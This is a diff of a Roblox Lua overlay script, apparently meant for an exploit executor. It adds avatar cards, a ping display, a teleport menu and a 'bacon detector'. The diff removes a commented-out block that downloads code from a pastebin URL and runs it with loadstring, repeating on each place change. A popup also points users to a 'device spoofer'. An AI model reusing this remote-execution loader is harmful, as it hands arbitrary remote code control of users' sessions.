@@ -1,5 +1,21 @@
--- STYLED Avatar Previews + Fixed Rotation + Bacon Detector + Account Age + Ping Display
--- Auto-scaling layout, better camera fit, bigger text, custom bacon notification, K toggle hide/show
+--[[
+    ============================================================
+    STYLED AVATAR PREVIEWS + AUTO LAYOUT + ACCOUNT AGE + PING
+    + TELEPORT MENU + MOBILE CONFIRM POPUP + BACON DETECTOR
+    + FADE TOGGLE ANIMATION
+    ============================================================
+
+    Press K to toggle the whole overlay:
+    - avatar cards
+    - ping display
+    - teleport menu button
+    - teleport menu panel
+    - mobile confirmation popup
+]]
+
+--==============================================================
+-- 1) SERVICES + SINGLETON CLEANUP
+--==============================================================
 
 local HttpService          = game:GetService("HttpService")
 local Players              = game:GetService("Players")
@@ -9,6 +25,7 @@ local UserInputService     = game:GetService("UserInputService")
 local CoreGui              = game:GetService("CoreGui")
 local TweenService         = game:GetService("TweenService")
 local Workspace            = game:GetService("Workspace")
+local TeleportService      = game:GetService("TeleportService")
 
 local LocalPlayer = Players.LocalPlayer
 
@@ -21,49 +38,37 @@ end
 local System = {}
 _G.AvatarPreviewSystem = System
 
---[[
-local scriptUrl = "https://pastebin.com/raw/NGySqVRd"
-
-local function executeRemoteScript()
-    local success, code = pcall(function()
-        return HttpService:GetAsync(scriptUrl)
-    end)
-
-    if success and code and code ~= "" then
-        local ok, err = pcall(function()
-            loadstring(code)()
-        end)
-        if not ok then
-            warn("Remote script execution failed:", err)
-        end
-    end
-end
-
-executeRemoteScript()
-
-local lastPlaceId = game.PlaceId
-RunService.Heartbeat:Connect(function()
-    if game.PlaceId ~= lastPlaceId and game.PlaceId ~= 0 then
-        lastPlaceId = game.PlaceId
-        task.wait(2)
-        executeRemoteScript()
-    end
-end)
---]]
+--==============================================================
+-- 2) CONFIG VALUES
+--==============================================================
 
 local BASE_PREVIEW_WIDTH   = 470
 local BASE_PREVIEW_HEIGHT  = 730
+
 local NAME_HEIGHT          = 42
 local VIEWPORT_HEIGHT      = 520
-local LABEL_HEIGHT         = 118
+local LABEL_HEIGHT         = 132
 
 local CARD_SPACING         = 20
 local SCREEN_PADDING       = 18
 local TOP_OFFSET           = 74
 local BOTTOM_PADDING       = 18
 local MIN_CARD_SCALE       = 0.42
+
 local ROTATION_SPEED_DEG   = 40
 local MAX_ASSETS_TO_CHECK  = 35
+
+local TOGGLE_FADE_TIME     = 0.22
+
+local HUB_ID               = 17625359962
+local TEAM_DEATHMATCH_ID   = 71874690745115
+local FFA_ID               = 129604661913557
+local GUN_GAME_ID          = 133215910299950
+local MOBILE_SERVER_ID     = 18126510175
+
+--==============================================================
+-- 3) STATE + UTILITY HELPERS
+--==============================================================
 
 local avatarValueCache = {}
 local activePreviews = {}
@@ -72,9 +77,25 @@ local warned = {}
 local previewsVisible = true
 local connections = {}
 local shuttingDown = false
+local toggleBusy = false
 
-local pingGui = nil
+local topBarGui = nil
+local pingHolder = nil
 local pingLabel = nil
+local pingFadeCover = nil
+local teleportMenuButton = nil
+local teleportButtonFadeCover = nil
+
+local teleportMenu = nil
+local teleportMenuFadeCover = nil
+local teleportWarningLabel = nil
+
+local mobileConfirmFrame = nil
+local mobileConfirmFadeCover = nil
+
+local activeNotifications = {}
+local NOTIFICATION_SPACING = 12
+
 local pingUpdateAccumulator = 0
 
 local layoutDirty = true
@@ -133,6 +154,30 @@ local function getScreenSize()
     return Vector2.new(1920, 1080)
 end
 
+local function createFadeCover(parent, color, zIndex, radius)
+    local cover = Instance.new("Frame")
+    cover.Name = "FadeCover"
+    cover.Size = UDim2.new(1, 0, 1, 0)
+    cover.Position = UDim2.new(0, 0, 0, 0)
+    cover.BackgroundColor3 = color
+    cover.BackgroundTransparency = 1
+    cover.BorderSizePixel = 0
+    cover.ZIndex = zIndex or 100
+    cover.Parent = parent
+    addCorner(cover, radius or 20)
+    return cover
+end
+
+local function tweenObject(instance, info, props)
+    local tween = TweenService:Create(instance, info, props)
+    tween:Play()
+    return tween
+end
+
+--==============================================================
+-- 4) TOP BAR: PING + TELEPORT MENU BUTTON
+--==============================================================
+
 local function getPingText()
     local ping = "?"
 
@@ -148,33 +193,100 @@ local function getPingText()
     return ping .. " ms"
 end
 
-local function createPingDisplay()
-    if pingGui then
-        safeDestroy(pingGui)
-        pingGui = nil
-        pingLabel = nil
+local function updatePingDisplay()
+    if pingLabel then
+        pingLabel.Text = "Ping: " .. getPingText()
+    end
+end
+
+local function showTeleportWarning(text)
+    if teleportWarningLabel then
+        teleportWarningLabel.Text = text
+        teleportWarningLabel.Visible = true
+
+        task.spawn(function()
+            task.wait(3)
+            if teleportWarningLabel and teleportWarningLabel.Text == text then
+                teleportWarningLabel.Visible = false
+            end
+        end)
+    end
+end
+
+local function teleportToPlace(placeId)
+    local ok, err = pcall(function()
+        TeleportService:Teleport(placeId, LocalPlayer)
+    end)
+
+    if not ok then
+        warn("Teleport failed:", err)
+        showTeleportWarning("Teleport failed.")
+    end
+end
+
+local function showMobileConfirmPopup()
+    if not mobileConfirmFrame then
+        return
     end
 
-    pingGui = Instance.new("ScreenGui")
-    pingGui.Name = "AvatarPreviewPingDisplay"
-    pingGui.ResetOnSpawn = false
-    pingGui.IgnoreGuiInset = true
-    pingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    pingGui.DisplayOrder = 100
-    pingGui.Parent = CoreGui
+    mobileConfirmFrame.Visible = true
+    mobileConfirmFadeCover.BackgroundTransparency = 0
+    tweenObject(
+        mobileConfirmFadeCover,
+        TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {BackgroundTransparency = 1}
+    )
+end
 
-    local holder = Instance.new("Frame")
-    holder.Name = "PingHolder"
-    holder.AnchorPoint = Vector2.new(0.5, 0)
-    holder.Position = UDim2.new(0.5, 0, 0, 14)
-    holder.Size = UDim2.new(0, 270, 0, 54)
-    holder.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
-    holder.BackgroundTransparency = 0.08
-    holder.BorderSizePixel = 0
-    holder.Parent = pingGui
-    addCorner(holder, 14)
-    addStroke(holder, Color3.fromRGB(120, 160, 255), 1.4, 0.35)
-    addGradient(holder, Color3.fromRGB(22, 24, 35), Color3.fromRGB(16, 18, 26), 90)
+local function hideMobileConfirmPopup()
+    if mobileConfirmFrame then
+        mobileConfirmFrame.Visible = false
+    end
+end
+
+local function createTopBarAndMenu()
+    if topBarGui then
+        safeDestroy(topBarGui)
+        topBarGui = nil
+        pingHolder = nil
+        pingLabel = nil
+        pingFadeCover = nil
+        teleportMenuButton = nil
+        teleportButtonFadeCover = nil
+        teleportMenu = nil
+        teleportMenuFadeCover = nil
+        teleportWarningLabel = nil
+        mobileConfirmFrame = nil
+        mobileConfirmFadeCover = nil
+    end
+
+    topBarGui = Instance.new("ScreenGui")
+    topBarGui.Name = "AvatarPreviewTopBar"
+    topBarGui.ResetOnSpawn = false
+    topBarGui.IgnoreGuiInset = true
+    topBarGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    topBarGui.DisplayOrder = 100
+    topBarGui.Parent = CoreGui
+
+    local container = Instance.new("Frame")
+    container.Name = "TopBarContainer"
+    container.AnchorPoint = Vector2.new(0.5, 0)
+    container.Position = UDim2.new(0.5, 0, 0, 14)
+    container.Size = UDim2.new(0, 510, 0, 54)
+    container.BackgroundTransparency = 1
+    container.Parent = topBarGui
+
+    pingHolder = Instance.new("Frame")
+    pingHolder.Name = "PingHolder"
+    pingHolder.Position = UDim2.new(0, 0, 0, 0)
+    pingHolder.Size = UDim2.new(0, 200, 0, 54)
+    pingHolder.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
+    pingHolder.BackgroundTransparency = 0.08
+    pingHolder.BorderSizePixel = 0
+    pingHolder.Parent = container
+    addCorner(pingHolder, 14)
+    addStroke(pingHolder, Color3.fromRGB(120, 160, 255), 1.4, 0.35)
+    addGradient(pingHolder, Color3.fromRGB(22, 24, 35), Color3.fromRGB(16, 18, 26), 90)
 
     pingLabel = Instance.new("TextLabel")
     pingLabel.Name = "PingLabel"
@@ -184,16 +296,313 @@ local function createPingDisplay()
     pingLabel.TextColor3 = Color3.fromRGB(230, 240, 255)
     pingLabel.TextStrokeTransparency = 0.85
     pingLabel.Font = Enum.Font.GothamBold
-    pingLabel.TextSize = 25
+    pingLabel.TextSize = 24
     pingLabel.Text = "Ping: " .. getPingText()
-    pingLabel.Parent = holder
+    pingLabel.Parent = pingHolder
+
+    pingFadeCover = createFadeCover(pingHolder, Color3.fromRGB(18, 20, 28), 20, 14)
+
+    local teleportButtonHolder = Instance.new("Frame")
+    teleportButtonHolder.Name = "TeleportButtonHolder"
+    teleportButtonHolder.Position = UDim2.new(0, 214, 0, 0)
+    teleportButtonHolder.Size = UDim2.new(0, 296, 0, 54)
+    teleportButtonHolder.BackgroundColor3 = Color3.fromRGB(18, 20, 28)
+    teleportButtonHolder.BackgroundTransparency = 0.08
+    teleportButtonHolder.BorderSizePixel = 0
+    teleportButtonHolder.Parent = container
+    addCorner(teleportButtonHolder, 14)
+    addStroke(teleportButtonHolder, Color3.fromRGB(120, 160, 255), 1.4, 0.35)
+    addGradient(teleportButtonHolder, Color3.fromRGB(22, 24, 35), Color3.fromRGB(16, 18, 26), 90)
+
+    teleportMenuButton = Instance.new("TextButton")
+    teleportMenuButton.Name = "TeleportMenuButton"
+    teleportMenuButton.Size = UDim2.new(1, 0, 1, 0)
+    teleportMenuButton.Position = UDim2.new(0, 0, 0, 0)
+    teleportMenuButton.BackgroundTransparency = 1
+    teleportMenuButton.BorderSizePixel = 0
+    teleportMenuButton.Text = ""
+    teleportMenuButton.AutoButtonColor = false
+    teleportMenuButton.Parent = teleportButtonHolder
+
+    local teleportMenuButtonLabel = Instance.new("TextLabel")
+    teleportMenuButtonLabel.Name = "TeleportMenuButtonLabel"
+    teleportMenuButtonLabel.BackgroundTransparency = 1
+    teleportMenuButtonLabel.Size = UDim2.new(1, -16, 1, 0)
+    teleportMenuButtonLabel.Position = UDim2.new(0, 8, 0, 0)
+    teleportMenuButtonLabel.Text = "Open Teleport Menu"
+    teleportMenuButtonLabel.TextColor3 = Color3.fromRGB(230, 240, 255)
+    teleportMenuButtonLabel.TextStrokeTransparency = 0.85
+    teleportMenuButtonLabel.Font = Enum.Font.GothamBold
+    teleportMenuButtonLabel.TextSize = 24
+    teleportMenuButtonLabel.Parent = teleportMenuButton
+
+    teleportButtonFadeCover = nil
+
+    teleportMenu = Instance.new("Frame")
+    teleportMenu.Name = "TeleportMenu"
+    teleportMenu.AnchorPoint = Vector2.new(0.5, 0)
+    teleportMenu.Position = UDim2.new(0.5, 0, 0, 78)
+    teleportMenu.Size = UDim2.new(0, 510, 0, 334)
+    teleportMenu.BackgroundColor3 = Color3.fromRGB(17, 19, 27)
+    teleportMenu.BackgroundTransparency = 0.08
+    teleportMenu.BorderSizePixel = 0
+    teleportMenu.Visible = false
+    teleportMenu.Parent = topBarGui
+    addCorner(teleportMenu, 16)
+    addStroke(teleportMenu, Color3.fromRGB(120, 150, 255), 1.4, 0.35)
+    addGradient(teleportMenu, Color3.fromRGB(24, 28, 40), Color3.fromRGB(14, 16, 24), 90)
+
+    local menuTitle = Instance.new("TextLabel")
+    menuTitle.Name = "MenuTitle"
+    menuTitle.BackgroundTransparency = 1
+    menuTitle.Position = UDim2.new(0, 14, 0, 10)
+    menuTitle.Size = UDim2.new(1, -28, 0, 28)
+    menuTitle.Text = "Teleport Menu"
+    menuTitle.TextColor3 = Color3.fromRGB(240, 245, 255)
+    menuTitle.Font = Enum.Font.GothamBold
+    menuTitle.TextSize = 24
+    menuTitle.TextXAlignment = Enum.TextXAlignment.Left
+    menuTitle.Parent = teleportMenu
+
+    local divider = Instance.new("Frame")
+    divider.BackgroundColor3 = Color3.fromRGB(95, 115, 170)
+    divider.BackgroundTransparency = 0.45
+    divider.BorderSizePixel = 0
+    divider.Position = UDim2.new(0, 14, 0, 44)
+    divider.Size = UDim2.new(1, -28, 0, 1)
+    divider.Parent = teleportMenu
+
+    local function createMenuButton(text, yPos)
+        local button = Instance.new("TextButton")
+        button.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
+        button.BackgroundTransparency = 0.12
+        button.BorderSizePixel = 0
+        button.Size = UDim2.new(1, -28, 0, 42)
+        button.Position = UDim2.new(0, 14, 0, yPos)
+        button.Text = text
+        button.TextColor3 = Color3.fromRGB(240, 245, 255)
+        button.Font = Enum.Font.GothamSemibold
+        button.TextSize = 20
+        button.AutoButtonColor = false
+        button.Parent = teleportMenu
+        addCorner(button, 12)
+        addStroke(button, Color3.fromRGB(130, 165, 230), 1.3, 0.22)
+        return button
+    end
+
+    local hubButton = createMenuButton("Hub", 58)
+    local mobileButton = createMenuButton("Mobile Hub", 106)
+    local ffaButton = createMenuButton("FFA", 154)
+    local gunGameButton = createMenuButton("Gun Game", 202)
+    local tdmButton = createMenuButton("Team Deathmatch", 250)
+
+    teleportWarningLabel = Instance.new("TextLabel")
+    teleportWarningLabel.Name = "TeleportWarning"
+    teleportWarningLabel.BackgroundTransparency = 1
+    teleportWarningLabel.Position = UDim2.new(0, 14, 1, -26)
+    teleportWarningLabel.Size = UDim2.new(1, -28, 0, 22)
+    teleportWarningLabel.Text = ""
+    teleportWarningLabel.TextColor3 = Color3.fromRGB(255, 210, 140)
+    teleportWarningLabel.Font = Enum.Font.Gotham
+    teleportWarningLabel.TextSize = 16
+    teleportWarningLabel.TextXAlignment = Enum.TextXAlignment.Left
+    teleportWarningLabel.Visible = false
+    teleportWarningLabel.Parent = teleportMenu
+
+    teleportMenuFadeCover = createFadeCover(teleportMenu, Color3.fromRGB(17, 19, 27), 20, 16)
+
+    mobileConfirmFrame = Instance.new("Frame")
+    mobileConfirmFrame.Name = "MobileConfirmFrame"
+    mobileConfirmFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    mobileConfirmFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    mobileConfirmFrame.Size = UDim2.new(0, 390, 0, 180)
+    mobileConfirmFrame.BackgroundColor3 = Color3.fromRGB(17, 19, 27)
+    mobileConfirmFrame.BackgroundTransparency = 0.04
+    mobileConfirmFrame.BorderSizePixel = 0
+    mobileConfirmFrame.Visible = false
+    mobileConfirmFrame.Parent = topBarGui
+    addCorner(mobileConfirmFrame, 16)
+    addStroke(mobileConfirmFrame, Color3.fromRGB(120, 150, 255), 1.4, 0.35)
+    addGradient(mobileConfirmFrame, Color3.fromRGB(24, 28, 40), Color3.fromRGB(14, 16, 24), 90)
+
+    local mobileConfirmTitle = Instance.new("TextLabel")
+    mobileConfirmTitle.Name = "MobileConfirmTitle"
+    mobileConfirmTitle.BackgroundTransparency = 1
+    mobileConfirmTitle.Position = UDim2.new(0, 14, 0, 12)
+    mobileConfirmTitle.Size = UDim2.new(1, -28, 0, 28)
+    mobileConfirmTitle.Text = "Mobile Hub Confirmation"
+    mobileConfirmTitle.TextColor3 = Color3.fromRGB(240, 245, 255)
+    mobileConfirmTitle.Font = Enum.Font.GothamBold
+    mobileConfirmTitle.TextSize = 22
+    mobileConfirmTitle.TextXAlignment = Enum.TextXAlignment.Left
+    mobileConfirmTitle.Parent = mobileConfirmFrame
+
+    local mobileConfirmDivider = Instance.new("Frame")
+    mobileConfirmDivider.BackgroundColor3 = Color3.fromRGB(95, 115, 170)
+    mobileConfirmDivider.BackgroundTransparency = 0.45
+    mobileConfirmDivider.BorderSizePixel = 0
+    mobileConfirmDivider.Position = UDim2.new(0, 14, 0, 46)
+    mobileConfirmDivider.Size = UDim2.new(1, -28, 0, 1)
+    mobileConfirmDivider.Parent = mobileConfirmFrame
+
+    local mobileConfirmText = Instance.new("TextLabel")
+    mobileConfirmText.Name = "MobileConfirmText"
+    mobileConfirmText.BackgroundTransparency = 1
+    mobileConfirmText.Position = UDim2.new(0, 14, 0, 58)
+    mobileConfirmText.Size = UDim2.new(1, -28, 0, 48)
+    mobileConfirmText.Text = "You need to use device spoofer."
+    mobileConfirmText.TextColor3 = Color3.fromRGB(230, 240, 255)
+    mobileConfirmText.Font = Enum.Font.GothamSemibold
+    mobileConfirmText.TextSize = 22
+    mobileConfirmText.TextWrapped = true
+    mobileConfirmText.TextXAlignment = Enum.TextXAlignment.Left
+    mobileConfirmText.TextYAlignment = Enum.TextYAlignment.Top
+    mobileConfirmText.Parent = mobileConfirmFrame
+
+    local yesButton = Instance.new("TextButton")
+    yesButton.Name = "YesButton"
+    yesButton.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
+    yesButton.BackgroundTransparency = 0.12
+    yesButton.BorderSizePixel = 0
+    yesButton.Position = UDim2.new(0, 14, 1, -56)
+    yesButton.Size = UDim2.new(0.5, -21, 0, 42)
+    yesButton.Text = "omg i know bruh"
+    yesButton.TextColor3 = Color3.fromRGB(240, 245, 255)
+    yesButton.Font = Enum.Font.GothamSemibold
+    yesButton.TextSize = 20
+    yesButton.AutoButtonColor = false
+    yesButton.Parent = mobileConfirmFrame
+    addCorner(yesButton, 12)
+    addStroke(yesButton, Color3.fromRGB(90, 110, 160), 1, 0.55)
+
+    local noButton = Instance.new("TextButton")
+    noButton.Name = "NoButton"
+    noButton.BackgroundColor3 = Color3.fromRGB(10, 12, 18)
+    noButton.BackgroundTransparency = 0.12
+    noButton.BorderSizePixel = 0
+    noButton.Position = UDim2.new(0.5, 7, 1, -56)
+    noButton.Size = UDim2.new(0.5, -21, 0, 42)
+    noButton.Text = "wait fr? nevermind ig"
+    noButton.TextColor3 = Color3.fromRGB(240, 245, 255)
+    noButton.Font = Enum.Font.GothamSemibold
+    noButton.TextSize = 20
+    noButton.AutoButtonColor = false
+    noButton.Parent = mobileConfirmFrame
+    addCorner(noButton, 12)
+    addStroke(noButton, Color3.fromRGB(90, 110, 160), 1, 0.55)
+
+    mobileConfirmFadeCover = createFadeCover(mobileConfirmFrame, Color3.fromRGB(17, 19, 27), 20, 16)
+
+    trackConnection(teleportMenuButton.MouseButton1Click:Connect(function()
+        if not previewsVisible then
+            return
+        end
+
+        if mobileConfirmFrame then
+            mobileConfirmFrame.Visible = false
+        end
+
+        teleportMenu.Visible = not teleportMenu.Visible
+        if teleportMenu.Visible then
+            teleportMenuFadeCover.BackgroundTransparency = 0
+            tweenObject(
+                teleportMenuFadeCover,
+                TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {BackgroundTransparency = 1}
+            )
+        end
+    end))
+
+    trackConnection(hubButton.MouseButton1Click:Connect(function()
+        teleportToPlace(HUB_ID)
+    end))
+
+    trackConnection(mobileButton.MouseButton1Click:Connect(function()
+        showMobileConfirmPopup()
+    end))
+
+    trackConnection(ffaButton.MouseButton1Click:Connect(function()
+        teleportToPlace(FFA_ID)
+    end))
+
+    trackConnection(gunGameButton.MouseButton1Click:Connect(function()
+        teleportToPlace(GUN_GAME_ID)
+    end))
+
+    trackConnection(tdmButton.MouseButton1Click:Connect(function()
+        teleportToPlace(TEAM_DEATHMATCH_ID)
+    end))
+
+    trackConnection(yesButton.MouseButton1Click:Connect(function()
+        hideMobileConfirmPopup()
+        teleportToPlace(MOBILE_SERVER_ID)
+    end))
+
+    trackConnection(noButton.MouseButton1Click:Connect(function()
+        hideMobileConfirmPopup()
+        showTeleportWarning("Mobile teleport cancelled.")
+    end))
 end
 
-local function updatePingDisplay()
-    if pingLabel then
-        pingLabel.Text = "Ping: " .. getPingText()
+local function setTopBarVisibleAnimated(visible)
+    if not topBarGui then
+        return
+    end
+
+    local info = TweenInfo.new(TOGGLE_FADE_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+    if visible then
+        topBarGui.Enabled = true
+
+        if pingFadeCover then
+            pingFadeCover.BackgroundTransparency = 0
+            tweenObject(pingFadeCover, info, {BackgroundTransparency = 1})
+        end
+
+        if teleportMenu.Visible and teleportMenuFadeCover then
+            teleportMenuFadeCover.BackgroundTransparency = 0
+            tweenObject(teleportMenuFadeCover, info, {BackgroundTransparency = 1})
+        end
+
+        if mobileConfirmFrame and mobileConfirmFrame.Visible and mobileConfirmFadeCover then
+            mobileConfirmFadeCover.BackgroundTransparency = 0
+            tweenObject(mobileConfirmFadeCover, info, {BackgroundTransparency = 1})
+        end
+
+        updatePingDisplay()
+    else
+        local pending = 0
+
+        if pingFadeCover then
+            pending = pending + 1
+            pingFadeCover.BackgroundTransparency = 1
+            local tween = tweenObject(pingFadeCover, info, {BackgroundTransparency = 0})
+            task.spawn(function()
+                tween.Completed:Wait()
+                pending = pending - 1
+                if pending <= 0 and not previewsVisible and topBarGui then
+                    topBarGui.Enabled = false
+                end
+            end)
+        end
+
+        if teleportMenu then
+            teleportMenu.Visible = false
+        end
+
+        if mobileConfirmFrame then
+            mobileConfirmFrame.Visible = false
+        end
+
+        if pending == 0 and topBarGui then
+            topBarGui.Enabled = false
+        end
     end
 end
+
+--==============================================================
+-- 5) RANK / AVATAR VALUE HELPERS
+--==============================================================
 
 local function getRankFromElo(elo)
     if elo <= 0 then
@@ -306,6 +715,10 @@ local function getAvatarValue(userId)
     return total
 end
 
+--==============================================================
+-- 6) CAMERA FITTING
+--==============================================================
+
 local function fitModelInViewport(preview)
     if not preview or not preview.Model or not preview.Camera or not preview.Viewport then
         return
@@ -347,6 +760,10 @@ local function fitModelInViewport(preview)
 
     camera.CFrame = CFrame.new(cameraPos, focus)
 end
+
+--==============================================================
+-- 7) PREVIEW CARDS
+--==============================================================
 
 local function cleanupPreview(userId)
     local data = activePreviews[userId]
@@ -536,13 +953,15 @@ local function createAvatarPreview(player)
     label.TextColor3 = Color3.fromRGB(205, 255, 220)
     label.TextStrokeTransparency = 0.88
     label.TextStrokeColor3 = Color3.new(0, 0, 0)
-    label.TextSize = 23
+    label.TextSize = 27
     label.Font = Enum.Font.GothamSemibold
     label.TextXAlignment = Enum.TextXAlignment.Center
     label.TextYAlignment = Enum.TextYAlignment.Center
     label.TextWrapped = true
     label.Text = "Loading..."
     label.Parent = card
+
+    local fadeCover = createFadeCover(card, Color3.fromRGB(17, 19, 27), 20, 20)
 
     activePreviews[userId] = {
         Gui = gui,
@@ -556,6 +975,7 @@ local function createAvatarPreview(player)
         Model = nil,
         StatsConnections = {},
         ScaleObject = uiScale,
+        FadeCover = fadeCover,
     }
 
     task.spawn(function()
@@ -596,7 +1016,6 @@ local function createAvatarPreview(player)
 
         model:PivotTo(CFrame.new(0, 0, 0) * CFrame.Angles(0, math.pi, 0))
         model.Parent = preview.World
-
         preview.Model = model
 
         task.wait()
@@ -679,6 +1098,10 @@ local function createAvatarPreview(player)
     end)
 end
 
+--==============================================================
+-- 8) AUTO LAYOUT
+--==============================================================
+
 local function getOtherPlayersSorted()
     local others = {}
     for _, player in ipairs(Players:GetPlayers()) do
@@ -721,7 +1144,6 @@ local function calculateBestGrid(count, screenSize)
     end
 
     bestScale = math.max(bestScale, MIN_CARD_SCALE)
-
     return bestCols, bestRows, bestScale
 end
 
@@ -783,93 +1205,50 @@ local function updateAllPreviews()
     end
 end
 
-trackConnection(RunService.Heartbeat:Connect(function(deltaTime)
-    if shuttingDown then
-        return
-    end
+--==============================================================
+-- 9) TOGGLE ANIMATION
+--==============================================================
 
-    local viewportSize = getScreenSize()
-    if viewportSize ~= lastViewportSize then
-        lastViewportSize = viewportSize
-        layoutDirty = true
-    end
+local function setPreviewsVisibleAnimated(visible)
+    local info = TweenInfo.new(TOGGLE_FADE_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
 
-    pingUpdateAccumulator = pingUpdateAccumulator + deltaTime
-    if pingUpdateAccumulator >= 0.35 then
-        pingUpdateAccumulator = 0
-        updatePingDisplay()
-    end
-
-    if layoutDirty then
-        layoutDirty = false
-        updateAllPreviews()
-    end
-
-    if not previewsVisible then
-        return
-    end
-
-    local rotationAngle = math.rad(ROTATION_SPEED_DEG * deltaTime)
-
-    for userId, data in pairs(activePreviews) do
-        local model = data.Model
-
-        if model and model.Parent then
-            model:PivotTo(model:GetPivot() * CFrame.Angles(0, rotationAngle, 0))
-        else
-            local player = Players:GetPlayerByUserId(userId)
-            if not player then
-                cleanupPreview(userId)
-            end
-        end
-    end
-end))
-
-trackConnection(UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then
-        return
-    end
-
-    if input.KeyCode == Enum.KeyCode.K then
-        previewsVisible = not previewsVisible
-
+    if visible then
         for _, data in pairs(activePreviews) do
             if data.Gui then
-                data.Gui.Enabled = previewsVisible
+                data.Gui.Enabled = true
+            end
+            if data.FadeCover then
+                data.FadeCover.BackgroundTransparency = 0
+                tweenObject(data.FadeCover, info, {BackgroundTransparency = 1})
             end
         end
 
-        if pingGui then
-            pingGui.Enabled = previewsVisible
-        end
-
-        if previewsVisible then
-            layoutDirty = true
-            updatePingDisplay()
-            print("Previews SHOWN")
-        else
-            print("Previews HIDDEN")
-        end
-    end
-end))
-
-trackConnection(Players.PlayerAdded:Connect(function(player)
-    task.delay(1, function()
-        if shuttingDown then
-            return
-        end
+        setTopBarVisibleAnimated(true)
         layoutDirty = true
-    end)
-end))
+    else
+        for _, data in pairs(activePreviews) do
+            if data.FadeCover then
+                data.FadeCover.BackgroundTransparency = 1
+                local tween = tweenObject(data.FadeCover, info, {BackgroundTransparency = 0})
 
-trackConnection(Players.PlayerRemoving:Connect(function(player)
-    task.delay(0.2, function()
-        cleanupPreview(player.UserId)
-        if not shuttingDown then
-            layoutDirty = true
+                task.spawn(function()
+                    tween.Completed:Wait()
+                    if not previewsVisible and data.Gui then
+                        data.Gui.Enabled = false
+                    end
+                end)
+            elseif data.Gui then
+                data.Gui.Enabled = false
+            end
         end
-    end)
-end))
+
+        setTopBarVisibleAnimated(false)
+    end
+end
+
+--==============================================================
+-- 10) BACON DETECTOR + NOTIFICATION
+--==============================================================
 
 local BACON_VARIANTS = {
     {
@@ -932,6 +1311,7 @@ local function isBacon(player)
                         break
                     end
                 end
+
                 if not hasHair then
                     match = false
                     break
@@ -955,48 +1335,60 @@ end
 
 local function showBaconWarning(name, baconType)
     pcall(function()
-        local old = CoreGui:FindFirstChild("CustomNotification")
-        if old then
-            old:Destroy()
+        local old = CoreGui:FindFirstChild("CustomNotificationContainer")
+        if not old then
+            local container = Instance.new("ScreenGui")
+            container.Name = "CustomNotificationContainer"
+            container.ResetOnSpawn = false
+            container.IgnoreGuiInset = true
+            container.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+            container.DisplayOrder = 200
+            container.Parent = CoreGui
         end
     end)
 
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "CustomNotification"
-    gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = true
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    gui.DisplayOrder = 200
-    gui.Parent = CoreGui
+    local gui = CoreGui:FindFirstChild("CustomNotificationContainer")
+    if not gui then
+        gui = Instance.new("ScreenGui")
+        gui.Name = "CustomNotificationContainer"
+        gui.ResetOnSpawn = false
+        gui.IgnoreGuiInset = true
+        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        gui.DisplayOrder = 200
+        gui.Parent = CoreGui
+    end
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 320, 0, 84)
-    frame.Position = UDim2.new(0, -340, 0, 20)
-    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    frame.Name = "NotificationFrame"
+    frame.Size = UDim2.new(0, 350, 0, 92)
+    frame.AnchorPoint = Vector2.new(1, 0)
+    frame.Position = UDim2.new(1, 370, 0, 20)
+    frame.BackgroundColor3 = Color3.fromRGB(17, 19, 27)
     frame.BorderSizePixel = 0
     frame.Parent = gui
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 8)
-    corner.Parent = frame
+    addCorner(frame, 14)
+    addStroke(frame, Color3.fromRGB(120, 150, 255), 1.4, 0.35)
+    addGradient(frame, Color3.fromRGB(24, 28, 40), Color3.fromRGB(14, 16, 24), 90)
 
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, -20, 0, 30)
-    title.Position = UDim2.new(0, 10, 0, 5)
+    title.Name = "Title"
+    title.Size = UDim2.new(1, -22, 0, 30)
+    title.Position = UDim2.new(0, 12, 0, 8)
     title.BackgroundTransparency = 1
     title.Text = "Bacon Detector"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.TextColor3 = Color3.fromRGB(240, 245, 255)
     title.Font = Enum.Font.GothamBold
     title.TextSize = 20
     title.TextXAlignment = Enum.TextXAlignment.Left
     title.Parent = frame
 
     local message = Instance.new("TextLabel")
-    message.Size = UDim2.new(1, -20, 0, 42)
-    message.Position = UDim2.new(0, 10, 0, 32)
+    message.Name = "Message"
+    message.Size = UDim2.new(1, -22, 0, 42)
+    message.Position = UDim2.new(0, 12, 0, 37)
     message.BackgroundTransparency = 1
     message.Text = tostring(name) .. " detected as " .. tostring(baconType)
-    message.TextColor3 = Color3.fromRGB(210, 210, 210)
+    message.TextColor3 = Color3.fromRGB(205, 255, 220)
     message.Font = Enum.Font.Gotham
     message.TextSize = 17
     message.TextWrapped = true
@@ -1004,30 +1396,64 @@ local function showBaconWarning(name, baconType)
     message.TextYAlignment = Enum.TextYAlignment.Top
     message.Parent = frame
 
+    table.insert(activeNotifications, frame)
+
+    local function updateNotificationStack(animated)
+        for i, notif in ipairs(activeNotifications) do
+            if notif and notif.Parent then
+                local targetPos = UDim2.new(1, -20, 0, 20 + ((i - 1) * (92 + NOTIFICATION_SPACING)))
+                if animated then
+                    TweenService:Create(
+                        notif,
+                        TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                        {Position = targetPos}
+                    ):Play()
+                else
+                    notif.Position = targetPos
+                end
+            end
+        end
+    end
